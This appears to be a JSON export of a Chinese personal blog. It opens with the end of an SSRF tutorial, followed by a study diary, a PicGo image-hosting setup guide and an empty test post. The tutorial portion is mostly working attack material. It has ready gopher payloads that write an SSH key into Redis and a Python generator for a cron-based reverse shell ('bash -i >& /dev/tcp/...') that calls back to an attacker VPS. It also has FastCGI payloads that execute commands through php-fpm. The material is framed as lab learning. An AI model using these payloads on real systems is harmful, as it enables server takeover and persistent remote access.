payload\n\n生成的payload同样进行url二次编码，然后利用Ubuntu服务器上的SSRF打过去：\nssrf.php?url=gopher%3A%2F%2F192.168.52.131%3A6379%2F\\_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%2524568%250D%250A%250A%250Assh-rsa%2520AAAAB3NzaC1yc2EAAAADAQABAAABgQDrCwrA1zAhmjeG6E%2F45IEs%2F9a6AWfXb6iwzo%252BD62y8MOmt%252Bsct27ZxGOcRR95FT6zrfFxqt2h56oLwml%2FTrxy5sExSQ%2FcvvLwUTWb3ntJYyh2eGkQnOf2d%252Bax2CVF8S6hn2Z0asAGnP3P4wCJlyR7BBTaka9QNH%2F4xsFDCfambjmYzbx9O2fzl8F67jsTq8BVZxy5XvSsoHdCtr7vxqFUd%2FbWcrZ5F1pEQ8tnEBYsyfMK0NuMnxBdquNVSlyQ%2FNnHKyWtI%2FOzzyfvtAGO6vf3dFSJlxwZ0aC15GOwJhjTpTMKq9jrRdGdkIrxLKe%252BXqQnjxtk4giopiFfRu8winE9scqlIA5Iu%2Fd3O454ZkYDMud7zRkSI17lP5rq3A1f5xZbTRUlxpa3Pcuolg%2FOOhoA3iKNhJ%2FJT31TU9E24dGh2Ei8K%252BPpT92dUnFDcmbEfBBQz7llHUUBxedy44Yl%252BSOsVHpNqwFcrgsq%2FWR5BGqnu54vTTdJh0pSrl%252BtniHEnWWU%253D%2520root%2540whoami%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252411%250D%250A%2Froot%2F.ssh%2F%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%252415%250D%250Aauthorized\\_keys%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A\n\n如下图，成功在主机192.168.52.131上面写入SSH公钥：\n\n如下图，ssh连接成功：\n\n创建计划任务反弹Shell注意：这个只能在Centos上使用，别的不行，好像是由于权限的问题。\n构造redis的命令如下：\nflushall  set 1 &#x27;\\\\n\\\\n\\*/1 \\* \\* \\* \\* bash -i &gt;&amp; /dev/tcp/47.xxx.xxx.72/2333 0&gt;&amp;1\\\\n\\\\n&#x27;  config set dir /var/spool/cron/  config set dbfilename root  save  // 47.xxx.xxx.72为攻击者vps的IP然后编写脚本，将其转化为Gopher协议的格式：import urllibprotocol=&quot;gopher://&quot;ip=&quot;192.168.52.131&quot;port=&quot;6379&quot;reverse\\_ip=&quot;47.xxx.xxx.72&quot;reverse\\_port=&quot;2333&quot;cron=&quot;\\\\n\\\\n\\\\n\\\\n\\*/1 \\* \\* \\* \\* bash -i &gt;&amp; /dev/tcp/%s/%s 0&gt;&amp;1\\\\n\\\\n\\\\n\\\\n&quot;%(reverse\\_ip,reverse\\_port)filename=&quot;root&quot;path=&quot;/var/spool/cron&quot;passwd=&quot;&quot;cmd=\\[&quot;flushall&quot;,\t &quot;set 1 &#123;&#125;&quot;.format(cron.replace(&quot; &quot;,&quot;$&#123;IFS&#125;&quot;)),\t &quot;config set dir &#123;&#125;&quot;.format(path),\t &quot;config set dbfilename &#123;&#125;&quot;.format(filename),\t &quot;save&quot;\t \\]if passwd:\tcmd.insert(0,&quot;AUTH &#123;&#125;&quot;.format(passwd))payload=protocol+ip+&quot;:&quot;+port+&quot;/\\_&quot;def redis\\_format(arr):\tCRLF=&quot;\\\\r\\\\n&quot;\tredis\\_arr = arr.split(&quot; &quot;)\tcmd=&quot;&quot;\tcmd+=&quot;\\*&quot;+str(len(redis\\_arr))\tfor x in redis\\_arr:\t\tcmd+=CRLF+&quot;$&quot;+str(len((x.replace(&quot;$&#123;IFS&#125;&quot;,&quot; &quot;))))+CRLF+x.replace(&quot;$&#123;IFS&#125;&quot;,&quot; &quot;)\tcmd+=CRLF\treturn cmdif \\_\\_name\\_\\_==&quot;\\_\\_main\\_\\_&quot;:\tfor x in cmd:\t\tpayload += urllib.quote(redis\\_format(x))\tprint payload\n\n生成的payload同样进行url二次编码，然后利用Ubuntu服务器上的SSRF打过去，即可在目标主机192.168.52.131上写入计划任务，等到时间后，攻击者vps上就会获得目标主机的shell：\n\n[GKCTF2020]EZ三剑客-EzWeb这道题利用的就是攻击内网Redis的思路。\n攻击内网FastCGIFastCGI指快速通用网关接口（Fast Common Gateway Interface／FastCGI）是一种让交互程序与Web服务器通信的协议。FastCGI是早期通用网关接口（CGI）的增强版本。FastCGI致力于减少网页服务器与CGI程序之间交互的开销，从而使服务器可以同时处理更多的网页请求。\n\n众所周知，在网站分类中存在一种分类就是静态网站和动态网站，两者的区别就是静态网站只需要通过浏览器进行解析，而动态网站需要一个额外的编译解析的过程。以Apache为例，当访问动态网站的主页时，根据容器的配置文件，它知道这个页面不是静态页面，Web容器就会把这个请求进行简单的处理，然后如果使用的是CGI，就会启动CGI程序（对应的就是PHP解释器）。接下来PHP解析器会解析php.ini文件，初始化执行环境，然后处理请求，再以规定CGI规定的格式返回处理后的结果，退出进程，Web server再把结果返回给浏览器。这就是一个完整的动态PHP Web访问流程。\n这里说的是使用CGI，而FastCGI就相当于高性能的CGI，与CGI不同的是它像一个常驻的CGI，在启动后会一直运行着，不需要每次处理数据时都启动一次，所以FastCGI的主要行为是将CGI解释器进程保持在内存中，并因此获得较高的性能 。\n\nphp-fpmFPM（FastCGI 进程管理器）可以说是FastCGI的一个具体实现，用于替换 PHP FastCGI 的大部分附加功能，对于高负载网站是非常有用的。\n攻击FastCGI的主要原理就是，在设置环境变量实际请求中会出现一个SCRIPT_FILENAME&#39;: &#39;/var/www/html/index.php这样的键值对，它的意思是php-fpm会执行这个文件，但是这样即使能够控制这个键值对的值，但也只能控制php-fpm去执行某个已经存在的文件，不能够实现一些恶意代码的执行。\n而在PHP 5.3.9后来的版本中，PHP增加了安全选项导致只能控制php-fpm执行一些php、php4这样的文件，这也增大了攻击的难度。但是好在PHP允许通过PHP_ADMIN_VALUE和PHP_VALUE去动态修改PHP的设置。\n那么当设置PHP环境变量为：auto_prepend_file = php://input;allow_url_include = On时，就会在执行PHP脚本之前包含环境变量auto_prepend_file所指向的文件内容，php://input也就是接收POST的内容，这个我们可以在FastCGI协议的body控制为恶意代码，这样就在理论上实现了php-fpm任意代码执行的攻击。\n详情请见：《SSRF系列之攻击FastCGI》\n测试环境：\n\nWEB服务器Ubuntu（192.168.43.166）存在SSRF漏洞：\n\n并且WEB服务器Ubuntu上存在FastCGI，那么我们就可以利用其SSRF漏洞去攻击其本地的FastCGI。\n\n假设在配置fpm时，将监听的地址设为了0.0.0.0:9000，那么就会产生php-fpm未授权访问漏洞，此时攻击者可以无需利用SSRF从服务器本地访问的特性，直接与服务器9000端口上的php-fpm进行通信，进而可以用fcgi_exp等工具去攻击服务器上的php-fpm实现任意代码执行。\n当内网中的其他主机上配置有fpm，且监听的地址为0.0.0.0:9000时，那么这台主机就可能存在php-fpm未授权访问漏洞，我们便可以利用Ubuntu服务器上的SSRF去攻击他，如果内网中的这台主机不存在php-fpm未授权访问漏洞，那么就直接利用Ubuntu服务器上的SSRF去攻击他显然是不行的。\n\n使用fcgi_exp工具攻击下载地址：https://github.com/piaca/fcgi_exp\n这个工具主要是用来攻击未授权访问php-fpm的，可用来测试是否可以直接攻击php-fpm，但需要自己将生成的payload进行转换一下。\n该工具需要go语言环境，下载后进入目录执行如下命令进行编译：\ngo build fcgi_exp.go                    # 编译fcgi_exp.go\n编译完成后，我们在攻击机上使用nc -lvvp 2333 &gt; fcg_exp.txt监听2333 端口来接收fcgi_exp生成的payload，另外再开启一个终端使用下面的命令来向2333端口发送payload：\n.&#x2F;fcgi_exp system 127.0.0.1 2333 &#x2F;var&#x2F;www&#x2F;html&#x2F;index.php “id”\n\n生成的fcg_exp.txt文件的内容是接收到的payload，内容如下：\n\n然后对fcg_exp.txt文件里的payload进行url编码，这里通过如下脚本实现（脚本是我从网上白嫖的嘿嘿）：\n# -*- coding: UTF-8 -*-from urllib.parse import quote, unquote, urlencode  \nfile &#x3D; open(‘fcg_exp.txt’,’r’)payload &#x3D; file.read()print(“gopher:&#x2F;&#x2F;127.0.0.1:9000&#x2F;_“+quote(payload).replace(“%0A”,”%0D”).replace(“%2F”,”&#x2F;“))\n执行上面的python脚本生成如下payload：\n\n这里还要对上面的payload进行二次url编码，然后将最终的payload内容放到?url&#x3D;后面发送过去：\nssrf.php?url=gopher%3A%2F%2F127.0.0.1%3A9000%2F\\_%2501%2501%2500%2501%2500%2508%2500%2500%2500%2501%2500%2500%2500%2500%2500%2500%2501%2504%2500%2501%2501%2514%2504%2500%250F%2510SERVER\\_SOFTWAREgo%2520%2F%2520fcgiclient%2520%250B%2509REMOTE\\_ADDR127.0.0.1%250F%2508SERVER\\_PROTOCOLHTTP%2F1.1%250E%2502CONTENT\\_LENGTH56%250E%2504REQUEST\\_METHODPOST%2509%255BPHP\\_VALUEallow\\_url\\_include%2520%253D%2520On%250Ddisable\\_functions%2520%253D%2520%250Dsafe\\_mode%2520%253D%2520Off%250Dauto\\_prepend\\_file%2520%253D%2520php%253A%2F%2Finput%250F%2517SCRIPT\\_FILENAME%2Fvar%2Fwww%2Fhtml%2Findex.php%250D%2501DOCUMENT\\_ROOT%2F%2500%2500%2500%2500%2501%2504%2500%2501%2500%2500%2500%2500%2501%2505%2500%2501%25008%2500%2500%253C%253Fphp%2520system%2528%2527id%2527%2529%253Bdie%2528%2527-----0vcdb34oju09b8fd-----%250D%2527%2529%253B%253F%253E\n\n如下图所示，命令执行成功：\n\n使用Gopherus工具攻击下载地址：https://github.com/tarunkant/Gopherus\n该工具可以帮你生成符合Gopher协议格式的payload，以利用SSRF攻击Redis、FastCGI、MySql等内网应用。\n使用Gopherus工具生成攻击FastCGI的payload：\npython gopherus.py –exploit fastcgi&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php    # 这里输入的是一个已知存在的php文件id    # 输入一个你要执行的命令\n\n然后还是将得到的payload进行二次url编码，将最终得到的payload放到?url&#x3D;后面打过去过去：\nssrf.php?url=gopher%3A//127.0.0.1%3A9000/\\_%2501%2501%2500%2501%2500%2508%2500%2500%2500%2501%2500%2500%2500%2500%2500%2500%2501%2504%2500%2501%2501%2504%2504%2500%250F%2510SERVER\\_SOFTWAREgo%2520/%2520fcgiclient%2520%250B%2509REMOTE\\_ADDR127.0.0.1%250F%2508SERVER\\_PROTOCOLHTTP/1.1%250E%2502CONTENT\\_LENGTH54%250E%2504REQUEST\\_METHODPOST%2509KPHP\\_VALUEallow\\_url\\_include%2520%253D%2520On%250Adisable\\_functions%2520%253D%2520%250Aauto\\_prepend\\_file%2520%253D%2520php%253A//input%250F%2517SCRIPT\\_FILENAME/var/www/html/index.php%250D%2501DOCUMENT\\_ROOT/%2500%2500%2500%2500%2501%2504%2500%2501%2500%2500%2500%2500%2501%2505%2500%2501%25006%2504%2500%253C%253Fphp%2520system%2528%2527id%2527%2529%253Bdie%2528%2527-----Made-by-SpyD3r-----%250A%2527%2529%253B%253F%253E%2500%2500%2500%2500\n\n\n命令执行成功。\n攻击内网MySql\n首先我们要先了解一下MySql数据库用户认证的过程。MySQL分为服务端和客户端。MySQL数据库用户认证采用的是 挑战&#x2F;应答 的方式，即服务器生成该挑战码(scramble)并发送给客户端，客户端用挑战码将自己的密码进行加密后，并将相应的加密结果返回给服务器，服务器本地用挑战码的将用户的密码加密，如果加密的结果和用户返回的加密的结果相同则用户认证成功，从而完成用户认证的过程。\n登录时需要用服务器发来的挑战码(scramble)将密码加密，但是当数据库用户密码为空时，加密后的密文也为空。客户端给服务端发的认证包就是相对固定的了。这样就无需交互了，可以通过Gopher协议来直接发送了。\n测试环境如下：\n\nUbuntu服务器为WEB服务器，存在SSRF漏洞，且上面运行着MySql服务，用户名为whoami，密码为空并允许空密码登录。\n下面我们还是使用Gopherus工具生成攻击Ubuntu服务器本地MySql的payload：\npython gopherus.py –exploit mysqlwhoami    # 登录用的用户名show databases;    # 登录后要执行的sql语句\n生成如下payload：\n\n将得到的paylaod进行url二次编码，然后将最终的payload内容放到?url&#x3D;后面发送打过去就行了。但是我这里失败了，不知道为什么……\nEnding……推荐一个SSRF练习靶场：\n\nssrf-lab：https://github.com/fengwenhua/ssrf-lab\n\n该靶场有一个好看又简洁的界面，提供了最基本的 REST API 和客户端 WebHook 功能用于 SSRF 测试。配置请看：https://www.heibai.org/post/1287.html\n\n本文多为笔者的学习总结，若有不当的地方还望各位经过的路过的大佬多多点评。\n个人博客：https://whoamianony.top/\n\n参考： https://blog.csdn.net/Ping_Pig&#x2F;article&#x2F;details&#x2F;99412487\nhttps://www.cnblogs.com/iors/p/9777571.html\nhttps://blog.csdn.net/qq_43625917&#x2F;article&#x2F;details&#x2F;104528645?utm_source&#x3D;app\nhttps://xz.aliyun.com/t/2115\nhttps://blog.csdn.net/weixin_36343353&#x2F;article&#x2F;details&#x2F;112277580\nhttps://blog.csdn.net/cj_Allen&#x2F;article&#x2F;details&#x2F;106855893\nhttps://www.redteaming.top/2019/07/15/浅析Redis中SSRF的利用/#Redis配合gopher协议进行SSRF\nhttps://bbs.ichunqiu.com/thread-58455-1-1.html\nhttps://blog.chaitin.cn/gopher-attack-surfaces/\nhttps://www.anquanke.com/post/id/197431#h2-6\nhttps://www.anquanke.com/post/id/145519#h2-14\n\n","categories":["学习"]},{"title":"2024 May","url":"/2024/05/01/May/","content":"2024 May5.6算是正式开始学习了吧，以后和wjh约定好每天来图书馆，希望每天能学习13h+\nMath\n第九讲中的 变限积分的计算学完，题目未刷 p177\n\nEnglish\n等下回去记100个单词（x\n\n408\n串的知识完结，学完kmp算法，回去巩固一下！\n\n还是那句话，贵在坚持，一定要坚持下去呀\n\n\n\n\n\n\n\n\n5.7今天学习状态貌似还不错？\nMath\n第9讲完结 p186\n\n第九讲算是开始了计算之旅，有很多没有想到的方法，感觉这个东西是个熟能生巧的事情，希望后面多刷题，练练脑子，题目越学写越快吧\nEnglish\n记单词 50个\n\n目前想法是每天早上记半个小时，然后晚上吃饭回来休息的时候记半个小时，暂定这样吧\n408\n二叉树遍历刚学 p145\n\n感觉408比数一简单些？也许是我的错觉，但感觉408越学越有意思了？\n感觉都是一些概念性的东西偏多，可以多做一些小程序的选择题\n\n\n\n\n\n\n5.8感觉今天状态更好了？除了早上iscc第二周刚开始，要一直速度交flag，下午才来的图书馆，状态还行，wjh下午也来了,希望能够坚持下去吧，今天终于记单词了！\nMath\n第九讲计算重温了一下\n第十讲开了个头 p190\n\nEnglish\n记了50个单词加油。。。\n\n408\n二叉树5.3视频看完，题未写完 p155\n\n感觉二叉树的遍历还需要多啃一啃 感觉挺好玩的，看看晚上能不能把剩下的题写完\n\n\n\n\n\n\n\n\n5.9今天过的也是比较充实，比较欣慰的一点是，开始记单词了（终于\n中午和好朋友在家里吃了自己蒸的生蚝，就是差一点蒜蓉酱，互相谈论了一下考研，\n能坚持下来就是成功！也就辛苦最后8个月！\nMath\n第十讲看完，题未做 p200\n准备明天把前十讲题目做完\n\n最近越发感觉到了计算量，很多题都没思路，但刷了一些题后，感觉好多了\n感觉就是个熟能生巧的事情后期多刷一点题目吧\nEnglish\n60+52 &#x2F;43min\n\n也算是开始好起来了呀，后期预计每天花1h+，学习100+复习100\n408\n树，森林 学完，题未做完 p183\n\n感觉数据结构，学起来挺有意思，蛮喜欢推理的过程，坚持下去！\n\n\n\n\n\n\n\n\n5.10今天只学了半天吧，感觉状态一般般吧，希望能延续下去\nMath\n将前面的题目都复现了一下\n\n狠狠的刷题，狠狠的总结\nEnglish\n记单词\n\n记单词，坚持下去吧！\n408\n没复习（我的错！！）\n\n总的来说就是，今天因为项目管理的实验，干扰了我的计划呜呜，明天一定坚持下来\n\n\n\n\n\n\n\n\n5.11\n喝了人生中的第一杯星巴克\n\n\n\nktv爽唱四小时\n\n5.12今天去参加湖北省信创，题目比较简单，第三名拿下了金奖\nweb发挥的不错，两个靶机全部解出来了\n后期好好学习一下批量脚本利用，放一些照片吧\n\n\n后续要好好认真复习了，还有期末考试的内容，速成吧…\n5.13今天复习了软件测试和算法，突然一下子感觉算法也没有那么难？？\n可能是那个老师讲的太好了\n","categories":["考研"]},{"title":"picgo+typora+sm.ms+tinypng配置","url":"/2024/05/14/picgo+typora+sm.ms+tinypng%E9%85%8D%E7%BD%AE/","content":"picgo+typora+sm.ms+tinypng配置引言由于最近感觉github图床访问速度太慢，于是换成了sm.ms感觉会好一些，但是sm.ms\n图床有大小限制，于是弄了个自动压缩的插件，下面是我在配置的过程中踩到的一些坑，记录了下来\ntypora配置在偏好设置里面配置如下\n\npicgo配置下载链接：https://github.com/PicGo\n在PicGo中配置服务API Token，如果你是SM.MS服务就配置SMMS的token，如果是阿里云OSS的服务就配置阿里云的token（token就是上面第2个文章标题下生成的API Token）\n\nsm.ms配置SMMS图床分海外和国内，如果海外访问不了，可以通过国内进行注册申请\n海外网址：https://sm.ms/\n国内网址：https://smms.app/\n\n点击Sign Up进行SMMS的账号注册\n\n获取Token密钥（后面图片上传需要用）登录SMMS系统，找到用户信息，选择API Token，点击Generate Secret Token生成token\n\ntinypng配置这里要在picgo下载一个插件tinypng（这里划重点， 后面踩了很多坑，划重点！）\n\n\n将api填入设置中就行\n踩坑！picgo软件可能会打不开sudo xattr -d com.apple.quarantine &quot;/Applications/PicGo.app&quot;\n\n运行即可打开\nnpm install picgo -g\n\n安装 picgo add compress选择使用 picgo use transformer参数配置 picgo config plugin compress\n\ncompress 选择压缩工具 默认选项\n\ntinypng 无损压缩，需要上传到 tinypng\nimagemin 压缩过程不需要经过网络，但是图片会有损耗\nimage2webp 本地有损压缩，支持 GIF 格式有损压缩 注意：有些图床（比如 sm.ms）不支持 webp 图片格式，会上传失败\n\n\nreason: certificate has expired 错误\n解决方法\n1、取消ssl验证： npm config set strict-ssl false 这个方法一般就可以解决了。  2、更换npm镜像源： npm config set registry http://registry.cnpmjs.orgnpm config set registry http://registry.npm.taobao.org \n\n\n\n\n\n安装gui插件npm install picgo -gnpm install ./picgo-plugin-&lt;your-plugin-name&gt;\n\nelectron版的PicGo配置文件的路径在不同的系统里是不同的：\n\nWindows: %APPDATA%\\picgo\\data.json\nLinux: $XDG_CONFIG_HOME/picgo/data.json or ~/.config/picgo/data.json\nmacOS: ~/Library/Application\\ Support/picgo/data.json\n\n举例，在windows里你可以在：\nC:\\Users\\你的用户名\\AppData\\Roaming\\picgo\\data.json找到它。\n在linux里你可以在：\n~/.config/picgo/data.json里找到它。\nmacOS同理。\n此时你的插件目录比如在 /usr/home/picgo-plugin-&lt;your-plugin-name&gt;里，\n在PicGo默认配置文件所在的目录下，输入：\nnpm install /usr/home/picgo-plugin-&lt;your-plugin-name&gt;\n\n\n\n插件下载失败tingpng地址：https://github.com/liujinpen/picgo-plugin-compress-tinypng\n开梯子没用，放弃直接安装的方式，采用npm方式安装\n我用的Mac，picgo路径如下： &#x2F;Users&#x2F;cunyu&#x2F;Library&#x2F;Application Support&#x2F;picgo（自己参照）\n解决方法： 首先，cd到这个路径下 然后Mac要安装一些插件，命令如下：\nbrew install libtool automake autoconf nasm\n\n​    \n这个过程可能要很久，建议开梯子或有homebrew源\n下面正式开始安装\n第一步：清理缓存\nnpm cache clean --force\n\n​    \n第二步：删除文件夹\n把整个node_modules都删除\n第三步：install一下\nnpm install picgo-plugin-compress --save --ignore-scripts --registry=https://registry.npm.taobao.org\n\n​      \n第四步：\nnpm install --registry=https://registry.npm.taobao.org\n\n\n\n\n\n在命令行找不到目录的记得对中间的空格用反斜杠转义一下。或者打印号\ncd &quot;Application Support&quot;cd Application/Support\n\n","categories":["杂谈"]},{"url":"/2024/05/15/test111/","content":"dsajdlkajsklajskldsjak\n"}]